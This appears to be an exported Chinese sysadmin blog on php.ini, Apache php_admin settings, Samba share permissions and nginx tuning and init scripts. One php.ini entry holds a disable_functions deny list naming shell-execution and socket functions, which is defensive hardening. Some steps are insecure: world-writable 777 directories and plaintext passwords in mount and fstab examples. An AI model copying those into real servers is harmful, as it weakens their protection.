extension_dir = “/path/to/php”&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;SYS &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;存放扩展库(模块)的目录，也就是PHP用来寻找动态扩展模块的目录。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Windows下默认为”C:/php5” [PHP-Core-HTTP]default_mimetype = “text/html”default_charset = ;”gb2312”&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;PHP默认会自动输出”Content-Type: text/html” HTTP头。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果将default_charset指令设为”gb2312”， &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;那么将会自动输出”Content-Type: text/html; charset=gb2312”。 [PHP-Core-Unicode]detect_unicode = On&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;尚无文档 [PHP-Core-Misc]auto_detect_line_endings = Off&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;是否让PHP自动侦测行结束符(EOL)。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果的你脚本必须处理Macintosh文件， &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;或者你运行在Macintosh上，同时又要处理unix或win32文件， &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;打开这个指令可以让PHP自动侦测EOL，以便fgets()和file()函数可以正常工作。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;但同时也会导致在Unix系统下使用回车符(CR)作为项目分隔符的人遭遇不兼容行为。 cgi.rfc2616_headers = 0&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;指定PHP在发送HTTP响应代码时使用何种报头。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;0 表示发送一个”Status: “报头，Apache和其它web服务器都支持。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;若设为1，则PHP使用RFC2616标准的头。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;除非你知道自己在做什么，否则保持其默认值 0 cgi.nph = Off&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在CGI模式下是否强制对所有请求都发送”Status: 200”状态码。 fastcgi.impersonate = Off&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;IIS中的FastCGI支持模仿客户端安全令牌的能力。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这使得IIS能够定义运行时所基于的请求的安全上下文。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Apache中的mod_fastcgi不支持此特性(03/17/2002) &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果在IIS中运行则设为On，默认为Off。 fastcgi.logging = On&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;是否记录通过FastCGI进行的连接。 [PHP-Core-Weirdy]&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这些选项仅存在于文档中，却不存在于phpinfo()函数的输出中 async_send = Off&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;是否异步发送。 from = ;”john@doe.com”&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;定义匿名ftp的密码(一个email地址) 近核心模块[Pcre]&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Perl兼容正则表达式模块 pcre.backtrack_limit = 100000&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;PCRE的最大回溯(backtracking)步数。 pcre.recursion_limit = 100000&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;PCRE的最大递归(recursion)深度。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果你将该值设的非常高，将可能耗尽进程的栈空间，导致PHP崩溃。 [Session]&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;除非使用session_register()或$_SESSION注册了一个变量。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;否则不管是否使用了session_start()，都不会自动添加任何session记录。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;包括resource变量或有循环引用的对象包含指向自身的引用的对象，不能保存在会话中。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;register_globals指令会影响到会话变量的存储和恢复。 session.save_handler = “files”&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;存储和检索与会话关联的数据的处理器名字。默认为文件(“files”)。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果想要使用自定义的处理器(如基于数据库的处理器)，可用”user”。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;有一个使用PostgreSQL的处理器：http://sourceforge.net/projects/phpform-ext/ session.save_path = “/tmp”&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;传递给存储处理器的参数。对于files处理器，此值是创建会话数据文件的路径。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Windows下默认为临时文件夹路径。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;你可以使用”N;[MODE;]/path”这样模式定义该路径(N是一个整数)。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;N表示使用N层深度的子目录，而不是将所有数据文件都保存在一个目录下。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;[MODE;]可选，必须使用8进制数，默认600(=384)，表示每个目录下最多保存的会话文件数量。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这是一个提高大量会话性能的好主意。]]></content>
      <tags>
        <tag>LAMP</tag>
        <tag>Php</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[常见apache php_admin_value php_admin_flag 设置]]></title>
    <url>%2F2017%2F08%2F10%2FPhp%2F7.%20%E5%B8%B8%E8%A7%81apache%20php_admin_value%20php_admin_flag%20%E8%AE%BE%E7%BD%AE%2F</url>
    <content type="text"><![CDATA[常见apache php_admin_value php_admin_flag 设置12345678910111213141516php_admin_value open_basedir /data/123:/tmp/php_admin_flag engine onphp_admin_flag log_errors onphp_admin_value max_execution_time 180php_admin_value upload_tmp_dir /mp/php_admin_value include_path /data/123/includephp_admin_flag short_open_tag onphp_admin_value memory_limit 8388608php_admin_value error_reporting 15php_admin_flag display_errors onphp_admin_flag track_errors offphp_admin_value error_log /home/logs/php_error.logphp_admin_flag magic_quotes_gpc onphp_admin_flag track_vars onphp_admin_value auto_prepend_file /data/123/php/prepend.phpphp_admin_value auto_append_file /data/123/php/append.php php_admin_value php_admin_flag php_value php_flag&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;前面的两个参数用在httpd.conf 中，后面的两个用在.htaccess中 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;至于 value 和 flag 的不同在于，前者用于设置值（如字符串）， 后后者只能是on off]]></content>
      <tags>
        <tag>LAMP</tag>
        <tag>Php</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[php.ini 文件配置]]></title>
    <url>%2F2017%2F08%2F10%2FPhp%2F8.%20php.ini%20%E6%96%87%E4%BB%B6%E9%85%8D%E7%BD%AE%2F</url>
    <content type="text"><![CDATA[php.ini 文件配置&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;前面已经拷贝了一个 php.ini 文件到 /usr/local/php/etc 目录下面，这是已经知道 php.ini 所在路径在哪里，但有时候并不知道 php.ini 所在路径，这时候就需要命令来查一查在哪里 1[root@lamp ~]# /usr/local/php/bin/php -i |head &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;看那一行 Loaded Configuration File =&gt; /usr/local/php/etc/php.ini 。如果这里为 None ，那么就说明没有加载到具体的 php.ini 。找到 php.ini 后，名 vim 打开它，发现很多行都是以 ； 开头的，这个符号在 php.ini 中作为注释符号，也就是说只要是以 ； 开头的行都是不起作用的。而php.ini 中常用的配置有如下： 1.配置 disable_function&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;默认是没有配置的 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;disable_functions = eval,assert,popen,passthru,escapeshellarg,escapeshellcmd,passthru,exec,system,chroot,scandir,chgrp,chown,escapeshellcmd,escapeshellarg,shell_exec,proc_get_status,ini_alter,ini_restore,dl,pfsockopen,openlog,syslog,readlink,symlink,leak,popepassthru,stream_socket_server,popen,proc_open,proc_close &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明，在 php 中有非常多的函数，在这些函数中有一些是不太安全的，所以有必要把它们禁掉。像 exec ，shell_exec 都是在 php 代码中执行 linux shell 命令，很危险，要禁掉。 2.配置 error_log&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果是 php 开发人员，那会经常遇到调试代码的情况，作为一个运维人员理应学会简单的 php 错误排查技能，其实 php 的错误跟 linux 下其他服务都是一样的，遇到错误后要查看错误日志，根据报错信息来判断错误的原因。那如何查看 php 的错误信息？遇到错误时，访问网站通常会显示白页，什么都没有，状态码是500.第一种情况，可以直接把错误信息显示在浏览器中，配置方法是在 php.ini 中找到 display_errors = on 。重启 apache 服务后，刷新页面，发现不再是白页，而是具体的错误。这样就可以根据错误来调试 php 代码了。这种情况适合临时调试，但是这种情况不适合长期配置，因为所有错误都会显示在浏览器上，假如哪天 php 程序员不小心写错一段代码，而且没有测试直接上传到服务器上了，那么用户就会直接看到这些错误，这样是不合适的。所以还有第二种情况，把错误信息输出到一个日志文件中，具体配置如下： 1[root@lamp ~]# vim /usr/local/php/etc/php.ini &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;加入或更改 123display_error=offlog_errors=onerror_log=/usr/local/php/logs/php_errors.log &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明：该文件一开始是不存在的，为了避免权限问题不能自动生成该文件，我们可以先创建该文件，并且修改权限为777 12[root@lamp ~]# mkdir /usr/local/php/logs[root@lamp ~]# chmod 777 /usr/local/php/logs 1error_reporting = E_ALL &amp; ~E_NOTICE &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明：首先要把错误不再浏览器显示，第二打开错误日志开关，然后指定错误日志的了路径，最后是定义错误日志的级别。配置完成后要重启 apache 服务，才会生效。 3.配置 open_basedir&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在 php 中是有这个 open_basedir 概念的，它的意思是，把执行 php 的用户限定在指定的路径下，这样通过权限缩小的方式达到安全目的。作为一个网站，其实只需要让 php 用户访问到网站的代码即可，没有必要让它去访问其他目录。 1[root@lamp ~]# vim /usr/local/php/etc/php.ini &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;加入或更改 1open_basedir = /data/www:/tmp &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明：/data/www 和 /tmp 是允许 php 可以访问的两个目录，同样也可以是多个，目录之间用 ： 分隔。一旦限定后，如果 php 试图去访问除 /data/www 和 /tmp 外的目录下的文件时，就会报错。错误类似于，Warning: file_exists() [function.file-exists]: open_basedir restriction in effect . File(../123.php) is not within the allowed path(s): &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;除了在 php.ini 中定义 open_basedir 外，其实还可以在 apache 的配置文件中定义，因为一个 apache 下可能有多个站点，针对不同的站点限定不同的 open_basedir 。 1[root@lamp ~]# vim /usr/local/apache2/conf/httpd.conf &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;或者虚拟主机配置文件 1[root@lamp ~]# vim /usr/local/apache2/conf/extra/httpd-vhosts.conf &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;加入 1php_admin_value open_basedir "/data/www/:/tmp/"]]></content>
      <tags>
        <tag>LAMP</tag>
        <tag>Php</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Samba服务器（多用户组、多用户有不同的访问权限）]]></title>
    <url>%2F2017%2F08%2F10%2FSamba%2F2.%20Samba%E6%9C%8D%E5%8A%A1%E5%99%A8%EF%BC%88%E5%A4%9A%E7%94%A8%E6%88%B7%E7%BB%84%E3%80%81%E5%A4%9A%E7%94%A8%E6%88%B7%E6%9C%89%E4%B8%8D%E5%90%8C%E7%9A%84%E8%AE%BF%E9%97%AE%E6%9D%83%E9%99%90%EF%BC%89%2F</url>
    <content type="text"><![CDATA[Samba服务器（多用户组、多用户有不同的访问权限） 首先服务器采用用户验证的方式，每个用户可以访问自己的宿主目录，并且只有该用户能访问宿主目录，并具有完全的权限，而其他人不能看到你的宿主目录。 建立一个caiwu的文件夹，希望caiwu组和lingdao组的人能看到，network02也可以访问，但只有caiwu01有写的权限。 建立一个lindao的目录，只有领导组的人可以访问并读写，还有network02也可以访问，但外人看不到那个目录 建立一个文件交换目录exchange，所有人都能读写，包括guest用户，但每个人不能删除别人的文件。 建立一个公共的只读文件夹public，所有人只读这个文件夹的内容。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;前期的工作 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;建立3个组： 12345groupadd caiwugroupadd networkgroupadd lingdao &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;添加用户并加入相关的组当中： 1234567891011useradd caiwu01 -g caiwuuseradd caiwu02 -g caiwuuseradd network01 -g networkuseradd network02 -g networkuseradd lingdao01 -g lingdaouseradd lingdao02 -g lingdao &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;然后我们使用smbpasswd -a caiwu01的命令为6个帐户分别添加到samba用户中 123456789mkdir /home/sambamkdir /home/samba/caiwumkdir /home/samba/lingdaomkdir /home/samba/exchangemkdir /home/samba/public &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;为了避免麻烦可以在这里把上面所有的文件夹的权限都设置成777，通过samba灵活的权限管理来设置上面的5点要求。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;以下是smb.conf的配置文件 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657[global]workgroup = bmit #我的网络工作组server string = Frank's Samba File Server#我的服务器名描述security = user#使用用户验证机制encrypt passwords = yessmb passwd file = /etc/samba/smbpasswd#使用加密密码机制，在win95和winnt使用的是明文其他的基本上可以按照默认的来。[homes]comment = Home Directoriesbrowseable = nowritable = yesvalid users = %Screate mode = 0664directory mode = 0775#homes段满足第1条件[caiwu]comment = caiwupath = /home/samba/caiwupublic = novalid users = @caiwu,@lingdao,network02write list = caiwu01printable = no#caiwu段满足我们的第2要求[lingdao]comment = lingdaopath = /home/samba/lingdaopublic = nobrowseable = novalid users = @lingdao,network02printable = no#lingdao段能满足我们的第3要求[exchage]comment = Exchange File Directorypath = /home/samba/exchangepublic = yeswritable = yes#exchange段基本能满足我们的第4要求，但不能满足每个人不能删除别人的文件这个条件，即使里设置了mask也是没用，其实这个条件只要unix设置一个粘着位就行 1chmod -R 1777 /home/samba/exchange &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;注意这里权限是1777，类似的系统目录/tmp也具有相同的权限，这个权限能实现每个人能自由写文件，但不能删除别人的文件这个要求 1234567[public]comment = Read Only Publicpath = /home/samba/publicpublic = yesread only = yes#这个public段能满足第5要求。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;到此为止设置已经能实现共享文件要求，记得重启服务 1#/etc/rc.d/init.d/smb restart &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果大家没有winodws，不妨先用samba的cilent端命令来测试一下 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令的用法举几个例子 1smbclient -L 服务器ip -N &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;guest帐户查询服务器的samba共享情况，可以检验一下是否lingdao目录时候能被guest帐户看到，应该是看不到的，当然也可以以某个用户的名义查看 1smbclient -L 服务器ip -U caiwu01 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;系统会提示密码，只要输入smb密码就行。 1234567smbclient //服务器ip/caiwu -U caiwu01#以caiwu01用户的名义登录caiwu目录smbmount //服务器ip/caiwu /mnt/caiwu -o username=caiwu01#把服务器的财务目录映射到本地的/mnt/caiwu目录。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;测试 1smbclient -L //localhost/share &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;或者 1smbclient-L \\127.0.0.1 -Umyname &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这时输入的密码就是你刚才设置的samba密码使用 windows用户 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在我的电脑地址栏里输入\192.168.1.1访问；也可windows+R输入\192.168.1.1；登录后可以右击映射到本地驱动器。 1net use * /delete Linux 使用smbclient 1#smbclient//192.168.1.1/Normal -U user%passwd 挂载到某个目录使用 12#mkdir/mnt/share#mount -o username=youruser,password=passwd //192.168.1.1/Normal /mnt/share &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;设置开机挂载将如下命令写入/etc/fstab 1//192.168.1.1/share /mnt/ml45 cifs defaults,auto,username=youruser,password=passwd 0 0 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;然后#mount -a]]></content>
      <tags>
        <tag>Samba</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[nginx 配置优化的几个参数]]></title>
    <url>%2F2017%2F08%2F10%2FNginx%2F9.%20nginx%20%E9%85%8D%E7%BD%AE%E4%BC%98%E5%8C%96%E7%9A%84%E5%87%A0%E4%B8%AA%E5%8F%82%E6%95%B0%2F</url>
    <content type="text"><![CDATA[nginx 配置优化的几个参数&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;最近在服务器上搞了一些nginx，研究了一下，总结总结。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;nginx配置文件里面需要注意的一些参数 1worker_processes 8 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;nginx要开启的进程数 一般等于cpu的总核数 其实一般情况下开4个或8个就可以了，多了没有太多用 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;每个nginx进程消耗的内存10兆的模样 1worker_cpu_affinity &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;仅适用于Linux，使用该选项可以绑定worker进程和CPU（2.4内核的机器用不了） &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;假如是8 cpu 分配如下： 12worker_cpu_affinity 00000001 00000010 00000100 00001000 0001000000100000 01000000 10000000 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;nginx可以使用多个worker进程，原因如下： 12345678to use SMP to decrease latency when workers blockend on disk I/O to limit number of connections per process when select()/poll() isused The worker_processes and worker_connections from the event sectionsallows you to calculate maxclients value: kmax_clients = worker_processes * worker_connectionsworker_rlimit_nofile 102400; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;每个nginx进程打开文件描述符最大数目 配置要和系统的单进程打开文件数一致,linux 2.6内核下开启文件打开数为65535，worker_rlimit_nofile就相应应该填写65535 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;nginx调度时分配请求到进程并不是那么的均衡，假如超过会返回502错误。这里写的大一点 1use epoll &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;nginx使用了最新的epoll（Linux 2.6内核）和kqueue（freebsd）网络I/O模型，而Apache则使用的是传统的select模型。处理大量的连接的读写，Apache所采用的select网络I/O模型非常低效。在高并发服务器中，轮询I/O是最耗时间的操作 目前Linux下能够承受高并发访问的Squid、Memcached都采用的是epoll网络I/O模型。 1worker_connections 65535; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;每个工作进程允许最大的同时连接数 （Maxclient = work_processes * worker_connections） 1keepalive_timeout 75 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;keepalive超时时间 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这里需要注意官方的一句话： 12345The parameters can differ from each other. Line Keep-Alive:timeout=time understands Mozilla and Konqueror. MSIE itself shutskeep-alive connection approximately after 60 seconds.client_header_buffer_size 16klarge_client_header_buffers 4 32k &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;客户请求头缓冲大小 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;nginx默认会用client_header_buffer_size这个buffer来读取header值，如果header过大，它会使用large_client_header_buffers来读取。如果设置过小HTTP头/Cookie过大 会报400 错误 nginx 400 bad request。求行如果超过buffer，就会报HTTP 414错误(URI Too Long)。nginx接受最长的HTTP头部大小必须比其中一个buffer大，否则就会报400的HTTP错误(Bad Request)。 1open_file_cache max 102400 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;使用字段:http, server, location 这个指令指定缓存是否启用,如果启用,将记录文件以下信息: 打开的文件描述符,大小信息和修改时间；存在的目录信息；在搜索文件过程中的错误信息； – 没有这个文件,无法正确读取,参考open_file_cache_errors 指令选项: &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;max - 指定缓存的最大数目,如果缓存溢出,最长使用过的文件(LRU)将被移除 例: 12345open_file_cache max=1000 inactive=20s;open_file_cache_valid 30s; open_file_cache_min_uses 2; open_file_cache_errors on;open_file_cache_errors &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;语法: 1open_file_cache_errors on | off &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;默认值:open_file_cache_errors off 使用字段:http, server, location 这个指令指定是否在搜索一个文件是记录cache错误. &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;open_file_cache_min_uses &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;语法: 1open_file_cache_min_uses number &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;默认值:open_file_cache_min_uses 1 使用字段:http, server, location 这个指令指定了在open_file_cache指令无效的参数中一定的时间范围内可以使用的最小文件数,如 果使用更大的值,文件描述符在cache中总是打开状态. &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;open_file_cache_valid &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;语法: 1open_file_cache_valid time &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;默认值:open_file_cache_valid 60 使用字段:http, server, location 这个指令指定了何时需要检查open_file_cache中缓存项目的有效信息. &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;开启gzip 12345678gzip on;gzip_min_length 1k;gzip_buffers 4 16k;gzip_http_version 1.0;gzip_comp_level 2;gzip_types text/plain application/x-JavaScript text/cssapplication/xml;gzip_vary on; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;缓存静态文件： 1234location ~* ^.+\.(swf|gif|png|jpg|js|css)$ &#123;root /usr/local/ku6/ktv/show.ku6.com/;expires 1m;&#125; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;优化Linux内核参数 123456789101112131415161718192021vi /etc/sysctl.conf # Addnet.ipv4.tcp_max_syn_backlog = 65536net.core.netdev_max_backlog = 32768net.core.somaxconn = 32768net.core.wmem_default = 8388608net.core.rmem_default = 8388608net.core.rmem_max = 16777216net.core.wmem_max = 16777216net.ipv4.tcp_timestamps = 0net.ipv4.tcp_synack_retries = 2net.ipv4.tcp_syn_retries = 2net.ipv4.tcp_tw_recycle = 1#net.ipv4.tcp_tw_len = 1net.ipv4.tcp_tw_reuse = 1net.ipv4.tcp_mem = 94500000 915000000 927000000net.ipv4.tcp_max_orphans = 3276800#net.ipv4.tcp_fin_timeout = 30#net.ipv4.tcp_keepalive_time = 120net.ipv4.ip_local_port_range = 1024 65535 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;附录：一些错误排查 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;PHP-cgi进程数不够用、php执行时间长（MySQL慢）、或者是php-cgi进程死掉，都会出现502错误 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;一般来说Nginx 502 Bad Gateway和php-fpm.conf的设置有关，而Nginx 504 Gateway Time-out则是与nginx.conf的设置有关 查看当前的PHP FastCGI进程数是否够用： 1netstat -anpo | grep "php-cgi" | wc -l &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果实际使用的“FastCGI进程数”接近预设的“FastCGI进程数”，那么，说明“FastCGI进程数”不够用，需要增大。 部分PHP程序的执行时间超过了Nginx的等待时间，可以适当增加nginx.conf配置文件中FastCGI的timeout时间，例如： 12345678http &#123;......fastcgi_connect_timeout 300;fastcgi_send_timeout 300;fastcgi_read_timeout 300;......&#125; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;413 Request Entity Too Large &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;增大client_max_body_size &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;client_max_body_size:指令指定允许客户端连接的最大请求实体大小,它出现在请求头部的Content-Length字段. 如果请求大于指定的值,客户端将收到一个”Request Entity Too Large” (413)错误. 记住,浏览器并不知道怎样显示这个错误. &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;php.ini中增大post_max_size 和upload_max_filesize]]></content>
      <tags>
        <tag>Nginx</tag>
        <tag>LNMP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[nginx启动脚本和配置文件]]></title>
    <url>%2F2017%2F08%2F10%2FNginx%2F7.%20nginx%E5%90%AF%E5%8A%A8%E8%84%9A%E6%9C%AC%E5%92%8C%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%2F</url>
    <content type="text"><![CDATA[nginx启动脚本和配置文件 编写 nginx 启动脚本，并加入系统服务 1vim /etc/init.d/nginx &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;写入内容： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071#!/bin/bash# chkconfig: - 30 21# description: http service.# Source Function Library. /etc/init.d/functions# Nginx SettingsNGINX_SBIN="/usr/local/nginx/sbin/nginx"NGINX_CONF="/usr/local/nginx/conf/nginx.conf"NGINX_PID="/usr/local/nginx/logs/nginx.pid"RETVAL=0prog="Nginx"start() &#123; echo -n $"Starting $prog: " mkdir -p /dev/shm/nginx_temp daemon $NGINX_SBIN -c $NGINX_CONF RETVAL=$? echo return $RETVAL&#125;stop() &#123; echo -n $"Stopping $prog: " killproc -p $NGINX_PID $NGINX_SBIN -TERM rm -rf /dev/shm/nginx_temp RETVAL=$? echo return $RETVAL&#125;reload()&#123; echo -n $"Reloading $prog: " killproc -p $NGINX_PID $NGINX_SBIN -HUP RETVAL=$? echo return $RETVAL&#125;restart()&#123; stop start&#125;configtest()&#123; $NGINX_SBIN -c $NGINX_CONF -t return 0&#125;case "$1" in start) start ;; stop) stop ;; reload) reload ;; restart) restart ;; configtest) configtest ;; *) echo $"Usage: $0 &#123;start|stop|reload|restart|configtest&#125;" RETVAL=1esacexit $RETVAL &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明：该启动脚本来自互联网。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;保存后，更改权限： 12chmod 755 /etc/init.d/nginxchkconfig --add nginx &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果需要开机启动，执行： 1chkconfig nginx on 更改 nginx 配置 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;首先把原来的配置文件清空 1&gt; /usr/local/nginx/conf/nginx.conf &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;“&gt;”这个符号为重定向的意思，单独用它，可以把一个文本文档快速清空。 1vim /usr/local/nginx/conf/nginx.conf &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;添加如下内容： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364user nobody nobody;worker_processes 2;error_log /usr/local/nginx/logs/nginx_error.log crit;pid /usr/local/nginx/logs/nginx.pid;worker_rlimit_nofile 51200;events&#123; use epoll; worker_connections 6000;&#125;http&#123; include mime.types; default_type application/octet-stream; server_names_hash_bucket_size 3526; server_names_hash_max_size 4096; log_format combined_realip '$remote_addr $http_x_forwarded_for [$time_local]' '$host "$request_uri" $status' '"$http_referer" "$http_user_agent"'; sendfile on; tcp_nopush on; keepalive_timeout 30; client_header_timeout 3m; client_body_timeout 3m; send_timeout 3m; connection_pool_size 256; client_header_buffer_size 1k; large_client_header_buffers 8 4k; request_pool_size 4k; output_buffers 4 32k; postpone_output 1460; client_max_body_size 10m; client_body_buffer_size 256k; client_body_temp_path /usr/local/nginx/client_body_temp; proxy_temp_path /usr/local/nginx/proxy_temp; fastcgi_temp_path /usr/local/nginx/fastcgi_temp; fastcgi_intercept_errors on; tcp_nodelay on; gzip on; gzip_min_length 1k; gzip_buffers 4 8k; gzip_comp_level 5; gzip_http_version 1.1; gzip_types text/plain application/x-javascript text/css text/htm application/xml;server&#123; listen 80; server_name localhost; index index.html index.htm index.php; root /usr/local/nginx/html; location ~ \.php$ &#123; include fastcgi_params; fastcgi_pass unix:/tmp/php-fcgi.sock; fastcgi_index index.php; fastcgi_param SCRIPT_FILENAME /usr/local/nginx/html$fastcgi_script_name; &#125;&#125;include /usr/local/nginx/conf/vhosts/*.conf;&#125; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明：该配置文件可以作为一个模版，可以用虚拟机服务器上，工作中也可以参考 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;nginx 的虚拟主机配置文件放在 /usr/local/nginx/conf/vhosts 下边，该部分配置改为include /usr/local/nginx/conf/vhosts/*.conf; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;保存配置后，先检验一下配置文件是否有错误存在： 1/usr/local/nginx/sbin/nginx -t &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果显示内容如下，则配置正确，否则需要根据错误提示修改配置文件： 12nginx: the configuration file /usr/local/nginx/conf/nginx.conf syntax is oknginx: configuration file /usr/local/nginx/conf/nginx.conf test is successful &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;重启 nginx 服务 1service nginx restart &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;apache 有一个默认虚拟主机，也就是说无论什么域名只要指向到这台机器都会访问到这个虚拟主机。其实，在 nginx 里面也有一个这样的默认虚拟主机，但它有一个配置可以用来标记哪个虚拟主机是默认的。 123mkdir /usr/local/nginx/conf/vhostcd 